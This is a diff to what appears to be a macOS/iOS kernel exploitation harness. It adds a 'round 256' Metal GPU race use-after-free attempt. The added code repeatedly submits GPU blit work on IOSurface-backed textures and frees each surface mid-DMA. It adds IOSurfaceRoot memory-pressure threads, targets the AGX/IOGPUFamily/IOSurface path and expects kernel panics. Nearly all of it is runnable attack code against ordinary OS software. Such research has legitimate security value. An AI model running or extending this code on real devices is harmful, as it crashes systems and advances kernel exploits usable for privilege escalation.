@@ -1635,6 +1635,114 @@ static void *p13_render_loop(void *arg) {
     return NULL;
 }
 
+/* r256: Metal GPU race UAF — submit GPU work referencing IOSurface, free during DMA */
+static volatile int r256_run = 0;
+static volatile int r256_submitted = 0;
+static volatile int r256_freed = 0;
+static volatile int r256_completed = 0;
+
+static void *r256_gpu_loop(void *arg) {
+    int tid = (int)(uintptr_t)arg;
+    /* Load Metal and create device + command queue via Objective-C runtime */
+    void *metal_lib = dlopen("/System/Library/Frameworks/Metal.framework/Metal", RTLD_LAZY);
+    if (!metal_lib) return NULL;
+
+    typedef void *(*MTLCreateDev_t)(void);
+    MTLCreateDev_t createDev = (MTLCreateDev_t)dlsym(metal_lib, "MTLCreateSystemDefaultDevice");
+    if (!createDev) { dlclose(metal_lib); return NULL; }
+    void *device = createDev();
+    if (!device) { dlclose(metal_lib); return NULL; }
+
+    /* Use objc_msgSend to call [device newCommandQueue] */
+    void *objc_lib = dlopen("/usr/lib/libobjc.A.dylib", RTLD_LAZY);
+    typedef void *(*objc_msgSend_t)(void *, void *);
+    typedef void *(*sel_reg_t)(const char *);
+    objc_msgSend_t msgSend = (objc_msgSend_t)dlsym(objc_lib, "objc_msgSend");
+    sel_reg_t selReg = (sel_reg_t)dlsym(objc_lib, "sel_registerName");
+    if (!msgSend || !selReg) { dlclose(metal_lib); dlclose(objc_lib); return NULL; }
+
+    void *newCmdQueue = selReg("newCommandQueue");
+    void *cmdQueue = msgSend(device, newCmdQueue);
+    if (!cmdQueue) { dlclose(metal_lib); dlclose(objc_lib); return NULL; }
+
+    void *newTexSel = selReg("newTextureWithDescriptor:iosurface:plane:level:");
+    void *newCmdBuf = selReg("commandBuffer");
+    void *newBlitEnc = selReg("blitCommandEncoder");
+    void *endEncoding = selReg("endEncoding");
+    void *commitSel = selReg("commit");
+    void *releaseSel = selReg("release");
+
+    /* MTLTextureDescriptor */
+    typedef void *(*cls_t)(const char *);
+    cls_t getClass = (cls_t)dlsym(objc_lib, "objc_getClass");
+    void *MTLTexDesc = getClass("MTLTextureDescriptor");
+    void *tex2dSel = selReg("texture2DDescriptorWithPixelFormat:width:height:mipmapped:");
+
+    /* Create IOSurface props for 128x128 BGRA */
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int w = 128, h = 128, bpe = 4, bpr = w * bpe;
+    int pf = 0x42475241;
+    CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef hn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef rn_cf = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn_cf);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+
+    /* texture2DDescriptor for MTLPixelFormatBGRA8Unorm (80) */
+    typedef void *(*msgSend4_t)(void *, void *, unsigned long, unsigned long, unsigned long, int);
+    msgSend4_t msgSend4 = (msgSend4_t)dlsym(objc_lib, "objc_msgSend");
+    void *texDesc = msgSend4(MTLTexDesc, tex2dSel, 80, (unsigned long)w, (unsigned long)h, 0);
+
+    while (r256_run) {
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        if (!surf) continue;
+
+        /* Create Metal texture backed by this IOSurface */
+        typedef void *(*msgSendTex_t)(void *, void *, void *, void *, unsigned long, unsigned long);
+        msgSendTex_t msgSendTex = (msgSendTex_t)dlsym(objc_lib, "objc_msgSend");
+        void *texture = msgSendTex(device, newTexSel, texDesc, surf, 0, 0);
+
+        if (texture) {
+            /* Create command buffer and blit encoder — this submits GPU work */
+            void *cmdBuf = msgSend(cmdQueue, newCmdBuf);
+            if (cmdBuf) {
+                void *encoder = msgSend(cmdBuf, newBlitEnc);
+                if (encoder) {
+                    /* The blit encoder references the texture → GPU will DMA from IOSurface */
+                    msgSend(encoder, endEncoding);
+                }
+                msgSend(cmdBuf, commitSel);
+                __sync_fetch_and_add(&r256_submitted, 1);
+
+                /* CRITICAL: Free IOSurface NOW while GPU may be accessing it */
+                CFRelease(surf);
+                __sync_fetch_and_add(&r256_freed, 1);
+
+                /* Release Metal objects — texture still references the freed IOSurface */
+                msgSend(texture, releaseSel);
+                /* Don't release cmdBuf — it's autoreleased */
+            } else {
+                CFRelease(surf);
+            }
+        } else {
+            CFRelease(surf);
+        }
+        if (r256_submitted % 32 == 0) sched_yield();
+    }
+
+    CFRelease(wn); CFRelease(hn); CFRelease(bn); CFRelease(rn_cf); CFRelease(pfn);
+    CFRelease(props);
+    dlclose(metal_lib);
+    dlclose(objc_lib);
+    return NULL;
+}
+
 /* r255: mach port race UAF — create IOSurface, get port, free surface, race port dealloc */
 static volatile int r255_run = 0;
 static volatile int r255_created = 0;
@@ -19945,6 +20053,71 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 256) {
+            rlog("*** rounds=256: Metal GPU race UAF ***\n");
+            rlog("  Create IOSurface → Metal texture → GPU blit command → free IOSurface\n");
+            rlog("  GPU DMA engine accesses IOSurface while kernel frees the object\n");
+            rlog("  Targets AGXG19P→IOGPUFamily→IOSurface path from panic backtrace\n\n");
+
+            char r256_sp[256];
+            { char *h = getenv("HOME"); snprintf(r256_sp, sizeof(r256_sp), "%s/Documents/uaf256_state.bin", h?h:"/tmp"); }
+            int r256_att = 0;
+            { FILE *f = fopen(r256_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0256) fread(&r256_att,4,1,f); fclose(f); } }
+            r256_att++;
+            rlog("  Attempt #%d\n", r256_att);
+            { FILE *f = fopen(r256_sp, "wb"); if (f) { uint32_t m=0xDEAD0256; fwrite(&m,4,1,f); fwrite(&r256_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r256_secs = 15;
+            if (argc > 3) r256_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r256_secs);
+            rlog("  >>> VERY HIGH PROBABILITY OF KERNEL PANIC <<<\n");
+            fflush(stdout);
+
+            r256_run = 1;
+            r256_submitted = 0; r256_freed = 0; r256_completed = 0;
+
+            /* 2 GPU threads */
+            pthread_t r256_gpu[2];
+            for (int i = 0; i < 2; i++)
+                pthread_create(&r256_gpu[i], NULL, r256_gpu_loop, (void*)(uintptr_t)i);
+
+            /* sel17/18 memory pressure */
+            io_service_t r256_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r256_conn = IO_OBJECT_NULL;
+            if (r256_svc) IOServiceOpen(r256_svc, mach_task_self(), 0, &r256_conn);
+            pthread_t r256_t17, r256_t18;
+            if (r256_conn) {
+                g_race250_conn = r256_conn;
+                g_race250_run = 1;
+                g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+                g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+                pthread_create(&r256_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r256_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            for (int s = 0; s < r256_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds submit=%d freed=%d reg=%d/%d\n", s+1,
+                     r256_submitted, r256_freed,
+                     g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r256_run = 0;
+            g_race250_run = 0;
+            for (int i = 0; i < 2; i++) pthread_join(r256_gpu[i], NULL);
+            if (r256_conn) {
+                pthread_join(r256_t17, NULL);
+                pthread_join(r256_t18, NULL);
+                IOServiceClose(r256_conn);
+                IOObjectRelease(r256_svc);
+            }
+
+            rlog("\n  === SURVIVED Metal GPU race! ===\n");
+            rlog("  Total: submit=%d freed=%d\n", r256_submitted, r256_freed);
+            rlog("*** r=256 complete ***\n");
             goto done;
         }
         if (rounds == 255) {
